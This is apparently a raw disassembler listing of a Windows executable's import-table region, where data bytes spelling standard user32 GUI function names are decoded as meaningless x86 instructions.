  4124c2:	add    BYTE PTR [eax],al
  4124c4:	enter  0x130,0x0
  4124c8:	add    BYTE PTR [eax],ah
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	adc    BYTE PTR [edi],ah
  4124ce:	add    DWORD PTR [eax],eax
	...
  4124d8:	pop    eax
  4124d9:	xor    al,0x1
  4124db:	add    BYTE PTR [eax-0x1ffffedf],bh
  4124e1:	daa    
  4124e2:	add    DWORD PTR [eax],eax
	...
  4124ec:	mov    al,ds:0x88000134
  4124f1:	and    al,BYTE PTR [ecx]
  4124f3:	add    ah,dh
  4124f5:	daa    
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	pushf  
  412501:	add    DWORD PTR ss:[eax],eax
  412504:	pushf  
  412505:	and    al,BYTE PTR [ecx]
  412507:	add    BYTE PTR [eax+0x128],ch
  41250d:	add    BYTE PTR [eax],al
  41250f:	add    BYTE PTR [eax],al
  412511:	add    BYTE PTR [eax],al
  412513:	add    BYTE PTR [eax],bh
  412515:	aaa    
  412516:	add    DWORD PTR [eax],eax
  412518:	push   eax
  412519:	and    eax,DWORD PTR [ecx]
  41251b:	add    ah,al
  41251d:	sub    BYTE PTR [ecx],al
	...
  412527:	add    BYTE PTR [edx],bl
  412529:	cmp    al,BYTE PTR [ecx]
  41252b:	add    BYTE PTR [ebx+eiz*1+0x1],ch
  41252f:	add    BYTE PTR [eax+0x29],bh
  412532:	add    DWORD PTR [eax],eax
	...
  41253c:	cmp    bh,BYTE PTR [edx]
  41253e:	add    DWORD PTR [eax],eax
  412540:	and    BYTE PTR [ecx+eax*1],ah
	...
  412557:	add    BYTE PTR [eax-0x6dfffed7],al
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    BYTE PTR [edx-0x4ffffed7],ah
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    BYTE PTR [esi-0x2bfffed7],bh
  41256d:	sub    DWORD PTR [ecx],eax
  41256f:	add    ah,ah
  412571:	sub    DWORD PTR [ecx],eax
  412573:	add    dh,dh
  412575:	sub    DWORD PTR [ecx],eax
  412577:	add    BYTE PTR [edx],al
  412579:	sub    al,BYTE PTR [ecx]
  41257b:	add    BYTE PTR [edx+ebp*1],dl
  41257e:	add    DWORD PTR [eax],eax
  412580:	and    BYTE PTR [edx],ch
  412582:	add    DWORD PTR [eax],eax
  412584:	sub    al,BYTE PTR cs:[ecx]
  412587:	add    BYTE PTR [esi+0x2a],al
  41258a:	add    DWORD PTR [eax],eax
  41258c:	pop    eax
  41258d:	sub    al,BYTE PTR [ecx]
  41258f:	add    BYTE PTR [esi+0x2a],ah
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	mov    gs,WORD PTR [edx]
  41259a:	add    DWORD PTR [eax],eax
  41259c:	sahf   
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [edx-0x35fffed6],dh
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    dh,bl
  4125a9:	sub    al,BYTE PTR [ecx]
  4125ab:	add    dl,ch
  4125ad:	sub    al,BYTE PTR [ecx]
  4125af:	add    ah,bh
  4125b1:	sub    al,BYTE PTR [ecx]
  4125b3:	add    BYTE PTR [edx],dl
  4125b5:	sub    eax,DWORD PTR [ecx]
  4125b7:	add    BYTE PTR [esi],bl
  4125b9:	sub    eax,DWORD PTR [ecx]
  4125bb:	add    BYTE PTR [ebx+ebp*1],ch
  4125be:	add    DWORD PTR [eax],eax
  4125c0:	inc    eax
  4125c1:	sub    eax,DWORD PTR [ecx]
  4125c3:	add    BYTE PTR [esi+0x2b],cl
  4125c6:	add    DWORD PTR [eax],eax
  4125c8:	sub    eax,DWORD PTR fs:[ecx]
  4125cb:	add    BYTE PTR [edx+0x2b],dh
  4125ce:	add    DWORD PTR [eax],eax
  4125d0:	test   BYTE PTR [ebx],ch
  4125d2:	add    DWORD PTR [eax],eax
  4125d4:	mov    gs,WORD PTR [ebx]
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	sahf   
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [eax-0x3bfffed5],bh
  4125e1:	sub    eax,DWORD PTR [ecx]
  4125e3:	add    al,dl
  4125e5:	sub    eax,DWORD PTR [ecx]
  4125e7:	add    ah,ch
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    ah,bh
  4125ed:	sub    eax,DWORD PTR [ecx]
  4125ef:	add    BYTE PTR [edx],cl
  4125f1:	sub    al,0x1
  4125f3:	add    BYTE PTR [eax],bl
  4125f5:	sub    al,0x1
  4125f7:	add    BYTE PTR [esp+ebp*1],ah
  4125fa:	add    DWORD PTR [eax],eax
  4125fc:	cmp    BYTE PTR [ecx+eax*1],ch
  4125ff:	add    BYTE PTR [esi+0x2c],cl
  412602:	add    DWORD PTR [eax],eax
  412604:	pop    edx
  412605:	sub    al,0x1
  412607:	add    BYTE PTR [edx+0x2c],ch
  41260a:	add    DWORD PTR [eax],eax
  41260c:	jl     0x41263a
  41260e:	add    DWORD PTR [eax],eax
  412610:	mov    gs,WORD PTR [ecx+eax*1]
  412613:	add    BYTE PTR [eax-0x47fffed4],ah
  412619:	sub    al,0x1
  41261b:	add    al,cl
  41261d:	sub    al,0x1
  41261f:	add    dh,dl
  412621:	sub    al,0x1
  412623:	add    ah,ah
  412625:	sub    al,0x1
  412627:	add    dh,dh
  412629:	sub    al,0x1
  41262b:	add    BYTE PTR [esi],al
  41262d:	sub    eax,0x2d140001
  412632:	add    DWORD PTR [eax],eax
  412634:	es sub eax,0x2d3c0001
  41263a:	add    DWORD PTR [eax],eax
  41263c:	dec    edx
  41263d:	sub    eax,0x2d5a0001
  412642:	add    DWORD PTR [eax],eax
  412644:	push   0x2d
  412646:	add    DWORD PTR [eax],eax
  412648:	je     0x412677
  41264a:	add    DWORD PTR [eax],eax
  41264c:	test   BYTE PTR ds:0x2d900001,ch
  412652:	add    DWORD PTR [eax],eax
  412654:	sahf   
  412655:	sub    eax,0x2daa0001
  41265a:	add    DWORD PTR [eax],eax
  41265c:	mov    eax,0xd000012d
  412661:	sub    eax,0x2dde0001
  412666:	add    DWORD PTR [eax],eax
  412668:	out    dx,al
  412669:	sub    eax,0x2dfe0001
  41266e:	add    DWORD PTR [eax],eax
  412670:	or     al,0x2e
  412672:	add    DWORD PTR [eax],eax
  412674:	push   ds
  412675:	add    DWORD PTR cs:[eax],eax
  412678:	xor    ch,BYTE PTR [esi]
  41267a:	add    DWORD PTR [eax],eax
  41267c:	dec    esi
  41267d:	add    DWORD PTR cs:[eax],eax
  412680:	pop    esi
  412681:	add    DWORD PTR cs:[eax],eax
  412684:	je     0x4126b4
  412686:	add    DWORD PTR [eax],eax
  412688:	xchg   BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	call   0x12e:0xac00012e
  412693:	add    BYTE PTR [esi-0x33fffed2],bh
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	fisubr DWORD PTR [esi]
  41269e:	add    DWORD PTR [eax],eax
  4126a0:	out    dx,al
  4126a1:	add    DWORD PTR cs:[eax],eax
  4126a4:	cli    
  4126a5:	add    DWORD PTR cs:[eax],eax
  4126a8:	push   cs
  4126a9:	das    
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	push   ds
  4126ad:	das    
  4126ae:	add    DWORD PTR [eax],eax
  4126b0:	cs das 
  4126b2:	add    DWORD PTR [eax],eax
  4126b4:	inc    eax
  4126b5:	das    
  4126b6:	add    DWORD PTR [eax],eax
  4126b8:	pop    eax
  4126b9:	das    
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	outs   dx,BYTE PTR ds:[esi]
  4126bd:	das    
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	jle    0x4126f1
  4126c2:	add    DWORD PTR [eax],eax
  4126c4:	call   0x12f:0xae00012f
  4126cb:	add    BYTE PTR [edx-0x39fffed1],bh
  4126d1:	das    
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	aam    0x2f
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	in     al,0x2f
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	cli    
  4126dd:	das    
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	or     al,0x30
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	push   ss
  4126e5:	xor    BYTE PTR [ecx],al
  4126e7:	add    BYTE PTR [esi],ch
  4126e9:	xor    BYTE PTR [ecx],al
  4126eb:	add    BYTE PTR [edx],bh
  4126ed:	xor    BYTE PTR [ecx],al
  4126ef:	add    BYTE PTR [eax+esi*1+0x1],cl
  4126f3:	add    BYTE PTR [eax+0x30],bl
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	jb     0x41272a
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	jle    0x41272e
  4126fe:	add    DWORD PTR [eax],eax
  412700:	mov    WORD PTR [eax],?
  412702:	add    DWORD PTR [eax],eax
  412704:	mov    ds:0xb8000130,al
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [eax],al
  41270d:	add    BYTE PTR [eax],al
  41270f:	add    ah,dl
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    al,ch
  412715:	xor    BYTE PTR [ecx],al
  412717:	add    BYTE PTR [eax],al
  412719:	xor    DWORD PTR [ecx],eax
  41271b:	add    BYTE PTR [esi],dl
  41271d:	xor    DWORD PTR [ecx],eax
  41271f:	add    BYTE PTR [esi],ah
  412721:	xor    DWORD PTR [ecx],eax
  412723:	add    BYTE PTR [ecx+esi*1],dh
  412726:	add    DWORD PTR [eax],eax
  412728:	dec    esp
  412729:	xor    DWORD PTR [ecx],eax
  41272b:	add    BYTE PTR [edx+0x31],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	xor    WORD PTR [ecx],ax
  412733:	add    BYTE PTR [eax+0x31],bh
  412736:	add    DWORD PTR [eax],eax
  412738:	xchg   esp,eax
  412739:	xor    DWORD PTR [ecx],eax
  41273b:	add    BYTE PTR [edx-0x49fffecf],ah
  412741:	xor    DWORD PTR [ecx],eax
  412743:	add    dh,al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    dl,dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    ah,ah
  41274d:	xor    DWORD PTR [ecx],eax
  41274f:	add    ah,ch
  412751:	xor    DWORD PTR [ecx],eax
  412753:	add    ah,bh
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [esi],cl
  412759:	xor    al,BYTE PTR [ecx]
  41275b:	add    BYTE PTR [edx+esi*1],bl
  41275e:	add    DWORD PTR [eax],eax
  412760:	xor    al,BYTE PTR cs:[ecx]
  412763:	add    BYTE PTR [eax+0x32],al
  412766:	add    DWORD PTR [eax],eax
  412768:	push   esi
  412769:	xor    al,BYTE PTR [ecx]
  41276b:	add    BYTE PTR [esi+0x32],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	js     0x4127a4
  412772:	add    DWORD PTR [eax],eax
  412774:	mov    dh,BYTE PTR [edx]
  412776:	add    DWORD PTR [eax],eax
  412778:	call   0x132:0xb0000132
  41277f:	add    al,al
  412781:	xor    al,BYTE PTR [ecx]
  412783:	add    ah,cl
  412785:	xor    al,BYTE PTR [ecx]
  412787:	add    dl,ah
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    ah,dh
  41278d:	xor    al,BYTE PTR [ecx]
  41278f:	add    BYTE PTR [esi],al
  412791:	xor    eax,DWORD PTR [ecx]
  412793:	add    BYTE PTR [esi],dl
  412795:	xor    eax,DWORD PTR [ecx]
  412797:	add    BYTE PTR [ebx+esi*1],ch
  41279a:	add    DWORD PTR [eax],eax
  41279c:	cmp    dh,BYTE PTR [ebx]
  41279e:	add    DWORD PTR [eax],eax
  4127a0:	push   eax
  4127a1:	xor    eax,DWORD PTR [ecx]
  4127a3:	add    BYTE PTR [ebx+esi*1+0x1],ah
  4127a7:	add    BYTE PTR [edx+0x33],bh
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cwde   
  4127ad:	xor    eax,DWORD PTR [ecx]
  4127af:	add    BYTE PTR [eax-0x43fffecd],dh
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    dh,cl
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    dl,bl
  4127bd:	xor    eax,DWORD PTR [ecx]
  4127bf:	add    dh,ch
  4127c1:	xor    eax,DWORD PTR [ecx]
  4127c3:	add    BYTE PTR [esi],al
  4127c5:	xor    al,0x1
  4127c7:	add    BYTE PTR [edx],dl
  4127c9:	xor    al,0x1
  4127cb:	add    BYTE PTR [eax],ah
  4127cd:	xor    al,0x1
  4127cf:	add    BYTE PTR [edx],dh
  4127d1:	xor    al,0x1
  4127d3:	add    BYTE PTR [edx+0x34],al
  4127d6:	add    DWORD PTR [eax],eax
  4127d8:	dec    esp
  4127d9:	xor    al,0x1
  4127db:	add    BYTE PTR [eax],al
  4127dd:	add    BYTE PTR [eax],al
  4127df:	add    BYTE PTR [esi+0x34],ah
  4127e2:	add    DWORD PTR [eax],eax
  4127e4:	je     0x41281a
  4127e6:	add    DWORD PTR [eax],eax
  4127e8:	xor    BYTE PTR [ecx+eax*1],0x0
  4127ec:	xchg   esp,eax
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [eax],al
  4127f1:	add    BYTE PTR [eax],al
  4127f3:	add    BYTE PTR [esi-0x43fffecc],ch
  4127f9:	xor    al,0x1
  4127fb:	add    dh,cl
  4127fd:	xor    al,0x1
  4127ff:	add    ah,bl
  412801:	xor    al,0x1
  412803:	add    ah,ah
  412805:	xor    al,0x1
  412807:	add    ah,dh
  412809:	xor    al,0x1
  41280b:	add    BYTE PTR [eax],al
  41280d:	xor    eax,0x350e0001
  412812:	add    DWORD PTR [eax],eax
  412814:	push   ss
  412815:	xor    eax,0x35220001
  41281a:	add    DWORD PTR [eax],eax
  41281c:	sub    al,0x35
  41281e:	add    DWORD PTR [eax],eax
  412820:	ss xor eax,0x353e0001
  412826:	add    DWORD PTR [eax],eax
  412828:	dec    eax
  412829:	xor    eax,0x35520001
  41282e:	add    DWORD PTR [eax],eax
  412830:	pop    esp
  412831:	xor    eax,0x35680001
  412836:	add    DWORD PTR [eax],eax
  412838:	je     0x41286f
  41283a:	add    DWORD PTR [eax],eax
  41283c:	jle    0x412873
  41283e:	add    DWORD PTR [eax],eax
  412840:	mov    BYTE PTR ds:0x35920001,dh
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    al,ds:0xa8000135
  41284d:	xor    eax,0x35b40001
  412852:	add    DWORD PTR [eax],eax
  412854:	mov    esi,0xc8000135
  412859:	xor    eax,0x35d20001
  41285e:	add    DWORD PTR [eax],eax
  412860:	fidiv  WORD PTR ds:0x35ec0001
  412866:	add    DWORD PTR [eax],eax
  412868:	clc    
  412869:	xor    eax,0x36000001
  41286e:	add    DWORD PTR [eax],eax
  412870:	or     al,0x36
  412872:	add    DWORD PTR [eax],eax
  412874:	push   ss
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	and    BYTE PTR [esi],dh
  41287a:	add    DWORD PTR [eax],eax
  41287c:	sub    BYTE PTR [esi],dh
  41287e:	add    DWORD PTR [eax],eax
  412880:	xor    dh,BYTE PTR [esi]
  412882:	add    DWORD PTR [eax],eax
  412884:	cmp    al,0x36
  412886:	add    DWORD PTR [eax],eax
  412888:	inc    esi
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	push   eax
  41288d:	add    DWORD PTR ss:[eax],eax
  412890:	pop    edx
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	fs add DWORD PTR ss:[eax],eax
  412898:	outs   dx,BYTE PTR ds:[esi]
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	xor    BYTE PTR [esi],0x1
  41289f:	add    BYTE PTR [edx+0x136],dl
  4128a5:	add    BYTE PTR [eax],al
  4128a7:	add    BYTE PTR [eax-0x3ffffeca],ch
  4128ad:	add    DWORD PTR ss:[eax],eax
  4128b0:	fdiv   DWORD PTR [esi]
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	hlt    
  4128b5:	add    DWORD PTR ss:[eax],eax
  4128b8:	or     al,0x37
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	and    al,0x37
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	add    BYTE PTR [eax],al
  4128c2:	add    BYTE PTR [eax],al
  4128c4:	inc    esi
  4128c5:	aaa    
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	pop    esp
  4128c9:	aaa    
  4128ca:	add    DWORD PTR [eax],eax
  4128cc:	jo     0x412905
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jle    0x412909
  4128d2:	add    DWORD PTR [eax],eax
  4128d4:	mov    dh,BYTE PTR [edi]
  4128d6:	add    DWORD PTR [eax],eax
  4128d8:	cwde   
  4128d9:	aaa    
  4128da:	add    DWORD PTR [eax],eax
  4128dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128dd:	aaa    
  4128de:	add    DWORD PTR [eax],eax
  4128e0:	mov    ah,0x37
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	les    esi,FWORD PTR [edi]
  4128e6:	add    DWORD PTR [eax],eax
  4128e8:	into   
  4128e9:	aaa    
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	fidiv  DWORD PTR [edi]
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	repnz aaa 
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	push   es
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [eax],bl
  4128f9:	cmp    BYTE PTR [ecx],al
  4128fb:	add    BYTE PTR [eax],ch
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    BYTE PTR [eax+edi*1],dh
  412902:	add    DWORD PTR [eax],eax
  412904:	dec    edx
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    BYTE PTR [eax+edi*1+0x1],bl
  41290b:	add    BYTE PTR [eax+edi*1+0x1],ch
  41290f:	add    BYTE PTR [eax+edi*1+0x389a0001],al
  412916:	add    DWORD PTR [eax],eax
  412918:	stos   BYTE PTR es:[edi],al
  412919:	cmp    BYTE PTR [ecx],al
  41291b:	add    BYTE PTR [esi-0x35fffec8],dh
  412921:	cmp    BYTE PTR [ecx],al
  412923:	add    dh,bl
  412925:	cmp    BYTE PTR [ecx],al
  412927:	add    dh,ch
  412929:	cmp    BYTE PTR [ecx],al
  41292b:	add    dh,bh
  41292d:	cmp    BYTE PTR [ecx],al
  41292f:	add    BYTE PTR [esi],cl
  412931:	cmp    DWORD PTR [ecx],eax
  412933:	add    BYTE PTR [ecx+edi*1],bl
  412936:	add    DWORD PTR [eax],eax
  412938:	sub    bh,BYTE PTR [ecx]
  41293a:	add    DWORD PTR [eax],eax
  41293c:	cmp    BYTE PTR [ecx],bh
  41293e:	add    DWORD PTR [eax],eax
  412940:	inc    esp
  412941:	cmp    DWORD PTR [ecx],eax
  412943:	add    BYTE PTR [eax+0x39],bl
  412946:	add    DWORD PTR [eax],eax
  412948:	cmp    DWORD PTR fs:[ecx],eax
  41294b:	add    BYTE PTR [ecx+edi*1+0x1],dh
  41294f:	add    BYTE PTR [esi+0x39],bh
  412952:	add    DWORD PTR [eax],eax
  412954:	xchg   esp,eax
  412955:	cmp    DWORD PTR [ecx],eax
  412957:	add    BYTE PTR [esi-0x45fffec7],bl
  41295d:	cmp    DWORD PTR [ecx],eax
  41295f:	add    al,dl
  412961:	cmp    DWORD PTR [ecx],eax
  412963:	add    al,ah
  412965:	cmp    DWORD PTR [ecx],eax
  412967:	add    al,dh
  412969:	cmp    DWORD PTR [ecx],eax
  41296b:	add    ah,bh
  41296d:	cmp    DWORD PTR [ecx],eax
  41296f:	add    BYTE PTR [eax],cl
  412971:	cmp    al,BYTE PTR [ecx]
  412973:	add    BYTE PTR [eax],al
  412975:	add    BYTE PTR [eax],al
  412977:	add    BYTE PTR [edx+edi*1],ah
  41297a:	add    DWORD PTR [eax],eax
  41297c:	add    BYTE PTR [eax],al
  41297e:	add    BYTE PTR [eax],al
  412980:	add    eax,0x67655202
  412985:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  41298c:	popa   
  41298d:	jae    0x412a02
  41298f:	push   edi
  412990:	add    BYTE PTR [eax],al
  412992:	push   ebp
  412993:	add    DWORD PTR [edi+0x65],eax
  412996:	je     0x4129eb
  412998:	arpl   WORD PTR [edx+0x6f],si
  41299b:	ins    BYTE PTR es:[edi],dx
  41299c:	ins    BYTE PTR es:[edi],dx
  41299d:	push   eax
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	jae    0x4129a1
  4129a1:	add    BYTE PTR [ecx+0x616f4c01],ch
  4129a7:	fs inc edx
  4129a9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x44004170
  4129b1:	add    BYTE PTR [ebx+0x6c],al
  4129b4:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  4129bb:	jb     0x4129bd
  4129bd:	add    BYTE PTR [edx+0x2],cl
  4129c0:	push   ebx
  4129c1:	gs je  0x412a11
  4129c4:	outs   dx,BYTE PTR gs:[esi]
  4129c6:	jne    0x412a0c
  4129c8:	gs popaw 
  4129cb:	jne    0x412a39
  4129cd:	je     0x412a18
  4129cf:	je     0x412a36
  4129d1:	ins    DWORD PTR es:[edi],dx
  4129d2:	add    BYTE PTR [eax],al
  4129d4:	pop    edi
  4129d5:	add    dl,BYTE PTR [ebx+0x65]
  4129d8:	je     0x412a2d
  4129da:	jns    0x412a4f
  4129dc:	inc    ebx
  4129dd:	outs   dx,DWORD PTR ds:[esi]
  4129de:	ins    BYTE PTR es:[edi],dx
  4129df:	outs   dx,DWORD PTR ds:[esi]
  4129e0:	jb     0x412a55
  4129e2:	add    BYTE PTR [eax],al
  4129e4:	mov    ds:0x57734901,eax
  4129e9:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  4129f0:	jae    0x412a5b
  4129f2:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  4129f6:	push   0x74654701
  4129fb:	push   edi
  4129fc:	imul   ebp,DWORD PTR [esi+0x64],0xa100776f
  412a03:	add    DWORD PTR [ecx+0x73],ecx
  412a06:	push   edi
  412a07:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412a0e:	popa   
  412a0f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412a13:	add    al,ch
  412a15:	add    DWORD PTR [edi+0x70],ecx
  412a18:	outs   dx,BYTE PTR gs:[esi]
  412a1a:	dec    ecx
  412a1b:	arpl   WORD PTR [edi+0x6e],bp
  412a1e:	add    BYTE PTR [eax],al
  412a20:	stos   DWORD PTR es:[edi],eax
  412a21:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412a25:	fs inc ebx
  412a27:	jne    0x412a9b
  412a29:	jae    0x412a9a
  412a2b:	jb     0x412a6e
  412a2d:	add    BYTE PTR [edx+eax*1+0x6e617254],dl
  412a34:	jae    0x412aa2
  412a36:	popa   
  412a37:	je     0x412a9e
  412a39:	inc    ecx
  412a3a:	arpl   WORD PTR [ebx+0x65],sp
  412a3d:	ins    BYTE PTR es:[edi],dx
  412a3e:	gs jb  0x412aa2
  412a41:	je     0x412ab2
  412a43:	jb     0x412a9c
  412a45:	add    BYTE PTR [ecx+0x0],ah
  412a48:	inc    ebx
  412a49:	jb     0x412ab0
  412a4b:	popa   
  412a4c:	je     0x412ab3
  412a4e:	push   eax
  412a4f:	outs   dx,DWORD PTR ds:[esi]
  412a50:	jo     0x412ac7
  412a52:	jo     0x412aa1
  412a54:	outs   dx,BYTE PTR gs:[esi]
  412a56:	jne    0x412a58
  412a58:	add    BYTE PTR ss:[ebx+0x68],al
  412a5c:	popa   
  412a5d:	jb     0x412ab4
  412a5f:	jo     0x412ad1
  412a61:	gs jb  0x412aa5
  412a64:	add    BYTE PTR [eax],al
  412a66:	mov    ds:0x57734901,al
  412a6b:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412a72:	imul   esp,DWORD PTR [ebx+0x6f],0x3b006564
  412a79:	add    DWORD PTR [edi+0x65],eax
  412a7c:	je     0x412acb
  412a7e:	gs jae 0x412af4
  412a81:	popa   
  412a82:	addr16 gs inc ebp
  412a85:	js     0x412afb
  412a87:	jb     0x412aea
  412a89:	dec    ecx
  412a8a:	outs   dx,BYTE PTR ds:[esi]
  412a8b:	outs   dx,WORD PTR ds:[esi]
  412a8d:	add    BYTE PTR [esi+0x0],al
  412a90:	inc    ebx
  412a91:	ins    BYTE PTR es:[edi],dx
  412a92:	outs   dx,DWORD PTR ds:[esi]
  412a93:	jae    0x412afa
  412a95:	inc    esp
  412a96:	gs jae 0x412b04
  412a99:	je     0x412b0a
  412a9b:	jo     0x412a9d
  412a9d:	add    cl,ch
  412a9f:	add    DWORD PTR [edi+0x70],ecx
  412aa2:	outs   dx,BYTE PTR gs:[esi]
  412aa4:	dec    ecx
  412aa5:	outs   dx,BYTE PTR ds:[esi]
  412aa6:	jo     0x412b1d
  412aa8:	je     0x412aee
  412aaa:	gs jae 0x412b18
  412aad:	je     0x412b1e
  412aaf:	jo     0x412ab1
  412ab1:	add    BYTE PTR [ebp+0x73795302],al
  412ab7:	je     0x412b1e
  412ab9:	ins    DWORD PTR es:[edi],dx
  412aba:	push   eax
  412abb:	popa   
  412abc:	jb     0x412b1f
  412abe:	ins    DWORD PTR es:[edi],dx
  412abf:	gs je  0x412b27
  412ac2:	jb     0x412b37
  412ac4:	dec    ecx
  412ac5:	outs   dx,BYTE PTR ds:[esi]
  412ac6:	outs   dx,WORD PTR ds:[esi]
  412ac8:	inc    ecx
  412ac9:	add    BYTE PTR [esi+0x2],cl
  412acc:	push   ebx
  412acd:	gs je  0x412b1d
  412ad0:	outs   dx,BYTE PTR gs:[esi]
  412ad2:	jne    0x412b1d
  412ad4:	je     0x412b3b
  412ad6:	ins    DWORD PTR es:[edi],dx
  412ad7:	dec    ecx
  412ad8:	outs   dx,BYTE PTR ds:[esi]
  412ad9:	outs   dx,WORD PTR ds:[esi]
  412adb:	push   edi
  412adc:	add    BYTE PTR [eax],al
  412ade:	adc    eax,0x6c655202
  412ae3:	gs popa 
  412ae5:	jae    0x412b4c
  412ae7:	inc    esp
  412ae8:	inc    ebx
  412ae9:	add    BYTE PTR [ecx+0x766e4901],cl
  412aef:	popa   
  412af0:	ins    BYTE PTR es:[edi],dx
  412af1:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412af9:	je     0x412afb
  412afb:	add    BYTE PTR [edx+eax*1+0x74697753],al
  412b02:	arpl   WORD PTR [eax+0x54],bp
  412b05:	outs   dx,DWORD PTR ds:[esi]
  412b06:	push   esp
  412b07:	push   0x69577369
  412b0c:	outs   dx,BYTE PTR ds:[esi]
  412b0d:	outs   dx,DWORD PTR fs:[esi]
  412b0f:	ja     0x412b11
  412b11:	add    BYTE PTR [esi+0x6c694b01],ah
  412b17:	ins    BYTE PTR es:[edi],dx
  412b18:	push   esp
  412b19:	imul   ebp,DWORD PTR [ebp+0x65],0x2bd0072
  412b20:	imul   esp,DWORD PTR [ebp+0x79],0x62
  412b24:	fs pop edi
  412b26:	gs jbe 0x412b8e
  412b29:	outs   dx,BYTE PTR ds:[esi]
  412b2a:	je     0x412b2c
  412b2c:	cmp    eax,0x65684300
  412b31:	arpl   WORD PTR [ebx+0x52],bp
  412b34:	popa   
  412b35:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  412b3d:	outs   dx,BYTE PTR ds:[esi]
  412b3e:	add    BYTE PTR [eax],al
  412b40:	sahf   
  412b41:	add    DWORD PTR [ecx+0x73],ecx
  412b44:	push   edx
  412b45:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412b4a:	jo     0x412bc0
  412b4c:	jns    0x412b4e
  412b4e:	mov    es,WORD PTR [ecx]
  412b50:	dec    ecx
  412b51:	jae    0x412b96
  412b53:	push   0x6c417261
  412b58:	jo     0x412bc2
  412b5a:	popa   
  412b5b:	dec    esi
  412b5c:	jne    0x412bcb
  412b5e:	gs jb  0x412bca
  412b61:	arpl   WORD PTR [edi+0x0],dx
  412b64:	mov    ch,0x0
  412b66:	inc    esp
  412b67:	jb     0x412bca
  412b69:	ja     0x412bb8
  412b6b:	outs   dx,BYTE PTR gs:[esi]
  412b6d:	jne    0x412bb1
  412b6f:	popa   
  412b70:	jb     0x412b72
  412b72:	mov    BYTE PTR [edx],al
  412b74:	push   esp
  412b75:	popa   
  412b76:	bound  esp,QWORD PTR [edx+0x65]
  412b79:	fs push esp
  412b7b:	gs js  0x412bf2
  412b7e:	dec    edi
  412b7f:	jne    0x412bf5
  412b81:	push   edi
  412b82:	add    BYTE PTR [eax],al
  412b84:	or     eax,DWORD PTR [ecx]
  412b86:	inc    edi
  412b87:	gs je  0x412bce
  412b8a:	inc    ebx
  412b8b:	inc    ebp
  412b8c:	js     0x412b8e
  412b8e:	jno    0x412b92
  412b90:	push   ebx
  412b91:	gs je  0x412beb
  412b94:	imul   ebp,DWORD PTR [esi+0x64],0x6752776f
  412b9b:	outs   dx,BYTE PTR ds:[esi]
  412b9c:	add    BYTE PTR [eax],al
  412b9e:	xchg   ebx,eax
  412b9f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412ba3:	je     0x412c17
  412ba5:	outs   dx,DWORD PTR ds:[esi]
  412ba6:	jns    0x412be9
  412ba8:	arpl   WORD PTR [ebx+0x65],sp
  412bab:	ins    BYTE PTR es:[edi],dx
  412bac:	gs jb  0x412c10
  412baf:	je     0x412c20
